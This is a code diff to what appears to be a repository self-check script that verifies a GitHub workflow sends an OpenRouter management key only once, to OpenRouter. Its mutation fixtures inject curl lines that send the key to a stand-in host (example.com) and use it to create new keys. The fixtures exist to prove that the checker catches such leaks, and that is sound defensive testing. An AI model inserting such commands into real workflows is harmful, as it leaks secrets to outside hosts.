@@ -3207,6 +3207,9 @@ def _check_board_wiring(board=None, product=None, readme=None, quiet=False):
     if board.count("openrouter.ai") != 1:
         fault("asks OpenRouter %d times; the spend card's key makes one read, its daily activity"
               % board.count("openrouter.ai"))
+    if board.count("Bearer $OPENROUTER_KEY") != 1:
+        fault("sends the spend card's key %d times; it goes once, to OpenRouter's daily activity (#134's second read, 1)"
+              % board.count("Bearer $OPENROUTER_KEY"))
     for other in sorted(glob.glob(".github/workflows/*.yml")):
         if other != BOARD_WORKFLOW and "secrets.OPENROUTER_KEY" in _read(other):
             fault("shares the spend card's management key with %s" % other)
@@ -3316,6 +3319,7 @@ BOARD_LOOSENINGS = (
     ("every run's target production", lambda t: t.replace("TARGET: ${{ github.event_name != 'workflow_dispatch' && 'production' || inputs.target }}", "TARGET: production", 1)),
     ("a key made with the spend card's key", lambda t: t.replace('          rm -f "$RUNNER_TEMP/activity.json"\n', '          rm -f "$RUNNER_TEMP/activity.json"\n          curl -sS --max-time 30 -X POST -H "Authorization: Bearer $OPENROUTER_KEY" "https://openrouter.ai/api/v1/keys" -d \'{"name":"x"}\'\n', 1)),
     ("a second OpenRouter read", lambda t: t.replace('          rm -f "$RUNNER_TEMP/activity.json"\n', '          rm -f "$RUNNER_TEMP/activity.json"\n          curl -sS --max-time 30 -H "Authorization: Bearer $OPENROUTER_KEY" "https://openrouter.ai/api/v1/credits"\n', 1)),
+    ("the spend card's key sent to another host", lambda t: t.replace('          rm -f "$RUNNER_TEMP/activity.json"\n', '          rm -f "$RUNNER_TEMP/activity.json"\n          curl -sS --max-time 30 -H "Authorization: Bearer $OPENROUTER_KEY" "https://example.com/"\n', 1)),
     ("the spend card's key read from elsewhere", lambda t: t.replace('"https://openrouter.ai/api/v1/activity")', '"https://openrouter.ai/api/v1/credits")', 1)),
     ("the fixed name never smoked", lambda t: t.replace('gated "$NEXT" wall && g=0 || g=$?', "g=0", 1)),
     ("a run summary written", lambda t: t.replace('          echo "open pull requests:', '          echo "rendered" >> "$GITHUB_STEP_SUMMARY"\n          echo "open pull requests:', 1)),
